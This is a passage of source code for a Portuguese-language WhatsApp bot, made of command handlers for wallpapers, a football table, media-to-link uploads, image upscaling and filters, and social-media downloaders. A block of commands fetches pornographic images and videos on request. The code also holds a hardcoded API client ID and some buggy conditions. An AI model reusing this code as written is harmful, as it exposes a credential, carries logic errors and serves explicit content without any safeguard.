const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(sender, { image: imagem, caption: `𝗔𝗾𝘂𝗶 𝗲𝘀𝘁𝗮 𝗼 𝘀𝗲𝘂 𝗽𝗿𝗲𝘀𝗲𝗻𝘁𝗲 𝗲𝘀𝗽𝗲𝗿𝗼 𝗾𝘂𝗲 𝘁𝗲𝗻𝗵𝗮 𝗴𝗼𝘀𝘁𝗮𝗱𝗼 , ${pushname}!` }, { quoted: info });
}
break;

case 'wall4k':
case 'Wall4k': {
reply(`𝗘𝘀𝘁𝗼𝘂 𝗯𝘂𝘀𝗰𝗮𝗻𝗱𝗼 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗮𝗴𝘂𝗮𝗿𝗱𝗲 𝘂𝗺 𝗽𝗼𝘂𝗾𝘂𝗶𝗻𝗵𝗼 👽`);
const wall4kData = fs.readFileSync('./IMAGENS/wall4k.js');
const jsonData = JSON.parse(wall4kData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `•「 ${pushname} 」\n• 𝗔𝗾𝘂𝗶 𝗲𝘀𝘁𝗮 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗲𝘀𝗽𝗲𝗿𝗼 𝗾𝘂𝗲 𝗴𝗼𝘀𝘁𝗲 😍` }, { quoted: info });
}
break;

case 'wallamarelo':
case 'Wallamarelo': {
reply(`𝗘𝘀𝘁𝗼𝘂 𝗯𝘂𝘀𝗰𝗮𝗻𝗱𝗼 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗮𝗴𝘂𝗮𝗿𝗱𝗲 𝘂𝗺 𝗽𝗼𝘂𝗾𝘂𝗶𝗻𝗵𝗼 👽`);
const wallamareloData = fs.readFileSync('./IMAGENS/wallamarelo.js');
const jsonData = JSON.parse(wallamareloData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `•「 ${pushname} 」\n• 𝗔𝗾𝘂𝗶 𝗲𝘀𝘁𝗮 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗲𝘀𝗽𝗲𝗿𝗼 𝗾𝘂𝗲 𝗴𝗼𝘀𝘁𝗲 😍` }, { quoted: info });
}
break;

case 'wallanimes':
case 'wallanime': {
reply(`𝗘𝘀𝘁𝗼𝘂 𝗯𝘂𝘀𝗰𝗮𝗻𝗱𝗼 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗮𝗴𝘂𝗮𝗿𝗱𝗲 𝘂𝗺 𝗽𝗼𝘂𝗾𝘂𝗶𝗻𝗵𝗼 👽`);
const wallanimesData = fs.readFileSync('./IMAGENS/wallanimes.js');
const jsonData = JSON.parse(wallanimesData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `•「 ${pushname} 」\n• 𝗔𝗾𝘂𝗶 𝗲𝘀𝘁𝗮 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗲𝘀𝗽𝗲𝗿𝗼 𝗾𝘂𝗲 𝗴𝗼𝘀𝘁𝗲 😍` }, { quoted: info });
}
break;

case 'wallazul':
case 'Wallazul': {
reply(`𝗘𝘀𝘁𝗼𝘂 𝗯𝘂𝘀𝗰𝗮𝗻𝗱𝗼 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗮𝗴𝘂𝗮𝗿𝗱𝗲 𝘂𝗺 𝗽𝗼𝘂𝗾𝘂𝗶𝗻𝗵𝗼 👽`);
const wallazulData = fs.readFileSync('./IMAGENS/wallazul.js');
const jsonData = JSON.parse(wallazulData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `•「 ${pushname} 」\n• 𝗔𝗾𝘂𝗶 𝗲𝘀𝘁𝗮 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗲𝘀𝗽𝗲𝗿𝗼 𝗾𝘂𝗲 𝗴𝗼𝘀𝘁𝗲 😍` }, { quoted: info });
}
break;

case 'wallazulclaro':
case 'wallclaro': {
reply(`𝗘𝘀𝘁𝗼𝘂 𝗯𝘂𝘀𝗰𝗮𝗻𝗱𝗼 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗮𝗴𝘂𝗮𝗿𝗱𝗲 𝘂𝗺 𝗽𝗼𝘂𝗾𝘂𝗶𝗻𝗵𝗼 👽`);
const wallazulclaroData = fs.readFileSync('./IMAGENS/wallazulclaro.js');
const jsonData = JSON.parse(wallazulclaroData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `•「 ${pushname} 」\n• 𝗔𝗾𝘂𝗶 𝗲𝘀𝘁𝗮 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗲𝘀𝗽𝗲𝗿𝗼 𝗾𝘂𝗲 𝗴𝗼𝘀𝘁𝗲 😍` }, { quoted: info });
}
break;

case 'wallbranco':
case 'Wallbranco': {
reply(`𝗘𝘀𝘁𝗼𝘂 𝗯𝘂𝘀𝗰𝗮𝗻𝗱𝗼 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗮𝗴𝘂𝗮𝗿𝗱𝗲 𝘂𝗺 𝗽𝗼𝘂𝗾𝘂𝗶𝗻𝗵𝗼 👽`);
const wallbrancoData = fs.readFileSync('./IMAGENS/wallbranco.js');
const jsonData = JSON.parse(wallbrancoData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `•「 ${pushname} 」\n• 𝗔𝗾𝘂𝗶 𝗲𝘀𝘁𝗮 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗲𝘀𝗽𝗲𝗿𝗼 𝗾𝘂𝗲 𝗴𝗼𝘀𝘁𝗲 😍` }, { quoted: info });
}
break;

case 'wallciano':
case 'Wallciano': {
reply(`𝗘𝘀𝘁𝗼𝘂 𝗯𝘂𝘀𝗰𝗮𝗻𝗱𝗼 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗮𝗴𝘂𝗮𝗿𝗱𝗲 𝘂𝗺 𝗽𝗼𝘂𝗾𝘂𝗶𝗻𝗵𝗼 👽`);
const wallcianoData = fs.readFileSync('./IMAGENS/wallciano.js');
const jsonData = JSON.parse(wallcianoData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `•「 ${pushname} 」\n• 𝗔𝗾𝘂𝗶 𝗲𝘀𝘁𝗮 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗲𝘀𝗽𝗲𝗿𝗼 𝗾𝘂𝗲 𝗴𝗼𝘀𝘁𝗲 😍` }, { quoted: info });
}
break;

case 'wallcinza':
case 'Wallcinza': {
reply(`𝗘𝘀𝘁𝗼𝘂 𝗯𝘂𝘀𝗰𝗮𝗻𝗱𝗼 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗮𝗴𝘂𝗮𝗿𝗱𝗲 𝘂𝗺 𝗽𝗼𝘂𝗾𝘂𝗶𝗻𝗵𝗼 👽`);
const wallcinzaData = fs.readFileSync('./IMAGENS/wallcinza.js');
const jsonData = JSON.parse(wallcinzaData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `•「 ${pushname} 」\n• 𝗔𝗾𝘂𝗶 𝗲𝘀𝘁𝗮 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗲𝘀𝗽𝗲𝗿𝗼 𝗾𝘂𝗲 𝗴𝗼𝘀𝘁𝗲 😍` }, { quoted: info });
}
break;


case 'walldark':
case 'Walldark': {
reply(`𝗘𝘀𝘁𝗼𝘂 𝗯𝘂𝘀𝗰𝗮𝗻𝗱𝗼 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗮𝗴𝘂𝗮𝗿𝗱𝗲 𝘂𝗺 𝗽𝗼𝘂𝗾𝘂𝗶𝗻𝗵𝗼 👽`);
const walldarkData = fs.readFileSync('./IMAGENS/walldark.js');
const jsonData = JSON.parse(walldarkData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `•「 ${pushname} 」\n• 𝗔𝗾𝘂𝗶 𝗲𝘀𝘁𝗮 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗲𝘀𝗽𝗲𝗿𝗼 𝗾𝘂𝗲 𝗴𝗼𝘀𝘁𝗲 😍` }, { quoted: info });
}
break;

case 'walllaranja':
case 'Walllaranja': {
reply(`𝗘𝘀𝘁𝗼𝘂 𝗯𝘂𝘀𝗰𝗮𝗻𝗱𝗼 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗮𝗴𝘂𝗮𝗿𝗱𝗲 𝘂𝗺 𝗽𝗼𝘂𝗾𝘂𝗶𝗻𝗵𝗼 👽`);
const walllaranjaData = fs.readFileSync('./IMAGENS/walllaranja.js');
const jsonData = JSON.parse(walllaranjaData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `•「 ${pushname} 」\n• 𝗔𝗾𝘂𝗶 𝗲𝘀𝘁𝗮 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗲𝘀𝗽𝗲𝗿𝗼 𝗾𝘂𝗲 𝗴𝗼𝘀𝘁𝗲 😍` }, { quoted: info });
}
break;

case 'wallmarrom':
case 'Wallmarrom': {
reply(`𝗘𝘀𝘁𝗼𝘂 𝗯𝘂𝘀𝗰𝗮𝗻𝗱𝗼 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗮𝗴𝘂𝗮𝗿𝗱𝗲 𝘂𝗺 𝗽𝗼𝘂𝗾𝘂𝗶𝗻𝗵𝗼 👽`);
const wallmarromData = fs.readFileSync('./IMAGENS/wallmarrom.js');
const jsonData = JSON.parse(wallmarromData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `•「 ${pushname} 」\n• 𝗔𝗾𝘂𝗶 𝗲𝘀𝘁𝗮 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗲𝘀𝗽𝗲𝗿𝗼 𝗾𝘂𝗲 𝗴𝗼𝘀𝘁𝗲 😍` }, { quoted: info });
}
break;

case 'wallmulti':
case 'Wallmulti': {
reply(`𝗘𝘀𝘁𝗼𝘂 𝗯𝘂𝘀𝗰𝗮𝗻𝗱𝗼 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗮𝗴𝘂𝗮𝗿𝗱𝗲 𝘂𝗺 𝗽𝗼𝘂𝗾𝘂𝗶𝗻𝗵𝗼 👽`);
const wallmultiData = fs.readFileSync('./IMAGENS/wallmulti.js');
const jsonData = JSON.parse(wallmultiData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `•「 ${pushname} 」\n• 𝗔𝗾𝘂𝗶 𝗲𝘀𝘁𝗮 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗲𝘀𝗽𝗲𝗿𝗼 𝗾𝘂𝗲 𝗴𝗼𝘀𝘁𝗲 😍` }, { quoted: info });
}
break;

case 'wallpreto':
case 'Wallpreto': {
reply(`𝗘𝘀𝘁𝗼𝘂 𝗯𝘂𝘀𝗰𝗮𝗻𝗱𝗼 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗮𝗴𝘂𝗮𝗿𝗱𝗲 𝘂𝗺 𝗽𝗼𝘂𝗾𝘂𝗶𝗻𝗵𝗼 👽`);
const wallpretoData = fs.readFileSync('./IMAGENS/wallpreto.js');
const jsonData = JSON.parse(wallpretoData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `•「 ${pushname} 」\n• 𝗔𝗾𝘂𝗶 𝗲𝘀𝘁𝗮 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗲𝘀𝗽𝗲𝗿𝗼 𝗾𝘂𝗲 𝗴𝗼𝘀𝘁𝗲 😍` }, { quoted: info });
}
break;

case 'wallrosa':
case 'Wallrosa': {
reply(`𝗘𝘀𝘁𝗼𝘂 𝗯𝘂𝘀𝗰𝗮𝗻𝗱𝗼 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗮𝗴𝘂𝗮𝗿𝗱𝗲 𝘂𝗺 𝗽𝗼𝘂𝗾𝘂𝗶𝗻𝗵𝗼 👽`);
const wallrosaData = fs.readFileSync('./IMAGENS/wallrosa.js');
const jsonData = JSON.parse(wallrosaData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `•「 ${pushname} 」\n• 𝗔𝗾𝘂𝗶 𝗲𝘀𝘁𝗮 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗲𝘀𝗽𝗲𝗿𝗼 𝗾𝘂𝗲 𝗴𝗼𝘀𝘁𝗲 😍` }, { quoted: info });
}
break;

case 'wallroxo':
case 'Wallroxo': {
reply(`𝗘𝘀𝘁𝗼𝘂 𝗯𝘂𝘀𝗰𝗮𝗻𝗱𝗼 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗮𝗴𝘂𝗮𝗿𝗱𝗲 𝘂𝗺 𝗽𝗼𝘂𝗾𝘂𝗶𝗻𝗵𝗼 👽`);
const wallroxoData = fs.readFileSync('./IMAGENS/wallroxo.js');
const jsonData = JSON.parse(wallroxoData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `•「 ${pushname} 」\n• 𝗔𝗾𝘂𝗶 𝗲𝘀𝘁𝗮 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗲𝘀𝗽𝗲𝗿𝗼 𝗾𝘂𝗲 𝗴𝗼𝘀𝘁𝗲 😍` }, { quoted: info });
}
break;

case 'wallverde':
case 'Wallverde': {
reply(`𝗘𝘀𝘁𝗼𝘂 𝗯𝘂𝘀𝗰𝗮𝗻𝗱𝗼 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗮𝗴𝘂𝗮𝗿𝗱𝗲 𝘂𝗺 𝗽𝗼𝘂𝗾𝘂𝗶𝗻𝗵𝗼 👽`);
const wallverdeData = fs.readFileSync('./IMAGENS/wallverde.js');
const jsonData = JSON.parse(wallverdeData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `•「 ${pushname} 」\n• 𝗔𝗾𝘂𝗶 𝗲𝘀𝘁𝗮 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗲𝘀𝗽𝗲𝗿𝗼 𝗾𝘂𝗲 𝗴𝗼𝘀𝘁𝗲 😍` }, { quoted: info });
}
break;

case 'wallvermelho':
case 'Wallvermelho': {
reply(`𝗘𝘀𝘁𝗼𝘂 𝗯𝘂𝘀𝗰𝗮𝗻𝗱𝗼 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗮𝗴𝘂𝗮𝗿𝗱𝗲 𝘂𝗺 𝗽𝗼𝘂𝗾𝘂𝗶𝗻𝗵𝗼 👽`);
const wallvermelhoData = fs.readFileSync('./IMAGENS/wallvermelho.js');
const jsonData = JSON.parse(wallvermelhoData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `•「 ${pushname} 」\n• 𝗔𝗾𝘂𝗶 𝗲𝘀𝘁𝗮 𝗼 𝘀𝗲𝘂 𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿 𝗲𝘀𝗽𝗲𝗿𝗼 𝗾𝘂𝗲 𝗴𝗼𝘀𝘁𝗲 😍` }, { quoted: info });
}
break;
case 'brasileirao': case 'Brasileirão':
try {
ABC = await fetchJson(`https://tohsaka.tech/api/brasileirao?apitoken=S`);
RST = "⚽️📊 *Tabela Brasileirão:*\n–\n"
RST += ABC.resultado.map((v, index) => `${index+1}°) Time: *${v.equipe}*\n• Pontos alcançados pelo time: *${v.pontos}*\n• Jogos jogados pelo time: *${v.jogosJogados}*`).join("\n–\n")
return reply(RST)
} catch(e) {
return reply("Ocorreu um erro")
}
break;
//𝐏𝐄𝐑𝐓𝐄 𝐃𝐄 𝐀𝐋𝐓𝐄𝐑𝐀𝐂̧𝐀̃𝐎 𝐃𝐄 𝐈𝐌𝐀𝐆𝐄𝐍𝐒
case 'gerarlink':
YSG = isQuotedVideo || isQuotedImage || isQuotedAudio || isImage || isVideo
if(!YSG) {
reagir(from, "⚠️")
reply(`Você precisa marcar uma imagem, vídeo ou áudio de até 200MB com o comando ou reply uma imagem ou vídeo e colocar na legenda: \`${prefix + command}\`.`)
return
}
if((isMedia && info.message.imageMessage.fileLenght < 209715200 || isQuotedImage && info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage.fileLength < 209715200) && !q.length <= 1) { 
boij = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage
owgi = await getFileBuffer(boij, 'image')
await sleep(1000)
reagir(from, "🔗")
res = await upload(owgi)
reply(res) 
} else if((isMedia && info.message.videoMessage.fileLength < 209715200 || isQuotedVideo && info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 209715200) && !q.length <= 1) { 
boij = isQuotedVideo ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.videoMessage : info.message.videoMessage
owgi = await getFileBuffer(boij, 'video')
await sleep(1000)
reagir(from, "🔗")
res = await upload(owgi)
reply(res)
} else if(isQuotedAudio && info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage.fileLength < 209715200) {
boij = isQuotedAudio ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.audioMessage : info.message.audioMessage
owgi = await getFileBuffer(boij, 'audio')
await sleep(1000)
reagir(from, "🔗")
res = await upload(owgi)
reply(res)
} else {
reagir(from, "❗")
reply('O gerador de link só funciona se o arquivo estiver abaixo de 200MB.')
}
break

case 'gerarlink2':
case 'videopralink2':
case 'imgpralink2':
try {
if((isMedia && !info.message.videoMessage || isQuotedImage) && !q.length <= 1) { 
reply("aguarde um momento")
boij = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage
owgi = await FileBuffer(boij, 'image')
res = await upload2(owgi)
reply(res) 
} else if((isMedia && info.message.videoMessage.seconds < 30 || isQuotedVideo && info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 30) && !q.length <= 1) { 
reply("aguarde um momento")
boij = isQuotedVideo ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.videoMessage : info.message.videoMessage
owgi = await FileBuffer(boij, 'video')
res = await upload2(owgi)
reply(res)
} else {
reply("Você deve marcar uma imagem, ou um vídeo de até 30 segundos..")
}
} catch {
reply("ocorreu um erro ao converter em link")
}
break
  
  
case 'fullhd':
reagir(from, "✨")
if((isMedia && !info.message.videoMessage || isQuotedImage)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage
imagem = await downloadContentFromMessage(post, 'image')
base64 = Buffer.from([])
for await(const send of imagem) { base64 = Buffer.concat( [ base64, send ] ) }
reply(`Alterando a qualidade da foto para *HD*, aguarde um pouco!`)
link = await upload2(base64)
data2 = await fetchJson(`https://aemt.me/remini?url=${link}&resolusi=4`)
amy.sendMessage(from, {image: {url: data2.url}}, {quoted: info}).catch(e => {
return reply(mess.error())
})
} else {
reply('Mencione uma imagem para atribuir o efeito a foto.')
}
break  
  
case 'tohd': case 'hd':
if((isMedia && !info.message.videoMessage || isQuotedImage)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage
imagem = await downloadContentFromMessage(post, 'image')
base64 = Buffer.from([])
b = Buffer.from([])
for await(const send of imagem) { base64 = Buffer.concat( [ base64, send ] ) }
reply(`Alterando a qualidade da foto para *HD*, aguarde um pouco!`)
fs.writeFileSync("hd.jpeg", base64);
var ft = ('./hd.jpeg')
link = await upload2(ft)
amy.sendMessage(from, {image: {url: `https://random-apis.shop/remini?link=${link}`}}, {quoted: info}).catch(e => {
return reply(`um erro foi detectado: ${e}`);
console.log(e)
})
} else {
reply('Mencione uma imagem para atribuir o efeito a foto.')
}
break//by sr.wesley
  
case 'lgbt': 
case 'hitler':
case 'pixelate': 
case 'sepia': 
case 'trash':
case 'wanted': 
case 'wasted': 
case 'rip': 
case 'jail':
case 'facepalm':
case 'invert': 
case 'del': 
case 'circle': 
case 'beautiful':
case 'blur':
case 'bolsonaro': 
case 'bobross': 
case 'mms': 
case 'comunismo':
if ((isMedia && !info.message.videoMessage || isQuotedImage)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage;
imagem = await downloadContentFromMessage(post, 'image');
base64 = Buffer.from([]);
for await (const send of imagem) {
base64 = Buffer.concat([base64, send]);
}
reagir(from, "🆙")
const amyID = '400116076ba4b73'; 
const imgurUrl = 'https://api.imgur.com/3/upload';    
const response = await fetch(imgurUrl, {
method: 'POST',
headers: {
Authorization: `amy-ID ${amyID}`,
Accept: 'application/json',
},
body: new URLSearchParams({
image: base64.toString('base64'),
type: 'base64'
})
});
const result = await response.json();
const link = result.data.link;
amy.sendMessage(from, {image: {url:`https://api.cariflex.xyz/api/canvas/${command}?link=${link}`}}, {quoted: info})
} else {
reply("Mencione uma imagem para atribuir o efeito à foto.");
}
break;

case 'hentai-vid'://by tzn
try {//by modelagem 
const gozeiprahentai = await fetchJson(`https://api.cariflex.xyz/api/random/hentai?apikey=${API_CARIFLEX}`);
if (gozeiprahentai.resultado && gozeiprahentai.resultado.length > 0) {
const gozeinocllr = gozeiprahentai.resultado[0];
await amy.sendMessage(sender, {video: {url: gozeinocllr.video_2}, caption: `
Título: ${gozeinocllr.title}
Categoria: ${gozeinocllr.category}
Visualizações: ${gozeinocllr.views_count}
Compartilhamentos: ${gozeinocllr.share_count}`, 
mimetype: "video/mp4"}, {quoted: info});
} else {//by tzn
reply('encontrei video n');
}
} catch {
    reply('broxou, pae');
}
break;

case 'hentai-gay':
case 'lesbian':
case 'ass':
case 'bdms':
case 'blowjob': 
case 'cuckold':
case 'cum':
case 'ero':
case 'femdom':
case 'foot': 
case 'gankbang':
case 'glasses':
case 'hentai':
case 'jahy':
case 'manga':
case 'neko':
case 'orgy':
case 'panties':
case 'pussy':
case 'neko2':
case 'tentacles':
case 'thighs':
case 'yuri':
case 'zettai':
 // by CRICIAN JS
reagir(from, "🔞")
hentai = await getBuffer(`https://api.cariflex.xyz/nsfw/${command}?apikey=${API_CARIFLEX}`)
await amy.sendMessage(sender, {image: hentai, thumbnail: null}, {quoted: info}).catch(e => {
reagir(from, '❌')
})
break

case 'insta_video': 
case 'instavideo':
try {
if(q.length < 5) return reply('Por favor, forneça um link de um(a) *foto, video, reels ou story* do Instagram.');
data = await fetchJson(`https://random-apis.online/api/instagram/v2?url=${q}`)
for (let i = 0; i < data.result.length; i++) {
let dmt = data.result[i].type
mimety = dmt === "video" ? "video/mp4" : dmt === "webp" ? "image/webp" : dmt === "image" ? "image/jpeg" : dmt === "audio" ? "audio/mpeg" : "video/mp4"
amy.sendMessage(from, {[mimety.split("/")[0]]: {url: data.result[i]._url}, mimetype: mimety}, {quoted: info}).catch(e => {
return reply(mess.error())
})
}
} catch (e) {
return reply(mess.error())
}
break

case 'insta_audio': 
case 'instaaudio':
try {
if(q.length < 5) return reply('Por favor, forneça um link de um(a) *foto, video, reels ou story* do Instagram.');
data = await fetchJson(`https://random-apis.online/api/instagram/v2?url=${q}`)
for (let i = 0; i < data.result.length; i++) {
let dmt = data.result[i].type
amy.sendMessage(from, {audio: {url: data.result[i]._url}, mimetype: "audio/mp4"}, {quoted: info})
}
} catch (e) {
return reagir(from, "❌")
}
break

case 'ptvmsg':
if (!isQuotedVideo && !info.message.videoMessage) {
return reply('Marque um vídeo/gif que você deseja converter para mensagem de vídeo.')}
amy.relayMessage(from, {ptvMessage: isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage }, {})
break

case 'instagram': case 'instareels':
if (!q) return reply ('Por favor, forneça o link do vídeo de um *reels do Instagram*.');
reply("espere um momento ");
try {
setTimeout(() => {reagir(from, "😸")}, 100)
result = await fetchJson(`https://api.cariflex.xyz/api/instagram?url=${q}`);
amy.sendMessage(from, {video: {url: result.resultado}}, {quoted: info})
} catch(e) {
reply(" erro ao baixar")
}
break;


case 'ytmp3-amy': 
if(!q) return reply(`Cade o link do áudio?`)
reagir(from, `🆙`)//ʙʏ ᴄʀɪᴄɪᴀɴ ᴊs
api = await fetchJson(`https://api.cariflex.xyz/api/ytmp4-8?url=${q}`)
amy.sendMessage(from, {audio: {url: `${api.resultado.dl_link}`}, mimetype: "audio/mpeg"},{quoted: info}).catch(err => {
reagir(from, "❌")
})
break 
//𝐏𝐀𝐑𝐓𝐄 𝐃𝐄 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐒 𝐂𝐀𝐒𝐄𝐒.......... 

case 'pinterest2':
if (!q) return reply('Digite o nome da imagem que você quer buscar')
reagir(from, '🆙') 
for (let i = 0; i < 3; i++) {
blap = await getBuffer(`https://api.cariflex.xyz/api/pinterest?text=${q}`)
await amy.sendMessage(from, {image: blap, thumbnail: null}, {quoted: info}).catch(e => {
reagir(from, '❌')
})
}
break

case 'gerarqr': 

try {

if(!q) return reply(`Digite o nome para gerar o qr`)
reply( "Gerando seu qrcode") 

let cari = await getBuffer(`https://api.cariflex.xyz/api/outros/qrcode?texto=${q}`)

await amy.sendMessage(from, 
{image: cari},
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break;

case 'pinterest':

try {

if(!q) return reply(`Digite o nome da imagem que vc quer buscar`)
reagir(from, "🆙")

let blap = await getBuffer(`https://api.cariflex.xyz/api/pinterest?text=${q}`)

await amy.sendMessage(from, 
{image: blap},
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break;


case 'gimage': case 'Gimage':
if(!q) return reply("cade o nome da imagem?")
try {
await sleep(2000)
dados = await fetchJson(`https://api.cariflex.xyz/api/gimage?txt=${q}`)
api = dados.resultado
reagir(from,"🆙")
 amy.sendMessage(from, {image: {url: `${api.result[0].url}`}, caption: `TITULO: ${api.result[0].title}`}, {quoted: info})
} catch (error) {
reagir(from, "❌")
}
break

case 'gerar-image': 
case 'image-ai':
if(!q) return reply(`Digite o nome para gerar a imagem`)
